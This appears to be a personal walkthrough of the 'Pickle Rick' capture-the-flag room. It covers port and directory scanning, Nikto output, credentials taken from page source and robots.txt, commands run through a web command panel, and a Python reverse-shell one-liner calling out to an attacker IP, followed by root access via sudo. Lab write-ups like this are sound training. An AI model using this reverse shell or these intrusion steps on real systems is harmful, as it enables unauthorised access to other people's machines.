---
tags:
  - programming/hacking/practice
---

# Pickle Rick! 

This is a CTF room with no details. Start machine, answer questions. Let's go!


# Dev Diary

## Master Info

Info that I've gotten along the way
- /assets is a valid dir
- Server is Apache/2.4.18(Ubuntu)
- Ports 80 and 22 are open (possible ssh connection)
- Username: R1ckRul3s
- 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
- robots.txt just containts "Wubbalubbadubdub" => password?
- login.php (login page?)
- less Sup3rS3cretPickl3Ingred.txt => mr. meeseek hair

## Basics

Basics first - let's check that it is alive

```
ipadd=xx.xx.xxx.xxx
ping $ipadd
```

Now, let's map this thing and see what ports are open `nmap $ipadd`
- 22
- 80

Great, let's check out the website and see what we can find.

Looks like Rick is a Pickle again and he needs some secret ingredients to turn him back. Just got to log onto his
computer to figure it out. 


## GoBuster

Let's see if we have any interesting directories to check out:

```
gobuster dir -u $ipadd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ./01_gobust.log
```
- /assets - hey, we can access this! 

## Page source

Hey! There's a username hidden in there - Username: R1ckRul3s

## SSH

Let's just see if we can ssh into it. `ssh R1ckRul3s@10.10.191.221`


## Nikto

Scan server for vulnerabilities. This is a new one

```
nikto -h $ipadd
. . . 
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-12-07 13:38:56 (GMT-5) (1814 seconds)
```

## Logging In

Going to `./login.php` this gets to a log in screen. We can use the username and password shown above and.... that
works! This gets to an interesting page "Command Panel" where we can enter commands. 

```
> ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Running `cat Sup3rS3cretPickl3Ingred.txt` results in a failed page that says: `Command disabled to make it hard for
future PICKLEEEE RICCCKKKK.`

Which, okay. Using `less` instead of `cat` results in: `mr. meeseek hair`

Now, we can poke around the file system and run some commands:

```
>ls /home
rick
ubuntu

> ls /home/rick
second ingredients

>less /home/rick/second\ ingredients
1 jerry tear
```

Now, let's see if we can find and ssh key.


```
> ls -a /home/ubuntu
...
.ssh
...
```

None of that was working - cheated to see what needed to be done. Duh, reverse shell. The cheatsheet used perl, but I
love Python, so Python it is. Determined the python3 exists using `which python3`

```
export RHOST="10.9.12.1";export RPORT=1234;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Get to root using `sudo su`. Now we can:

```
> sudo su
> cd /root
> ls -la

3rd.txt
cat 3rd.txt
```
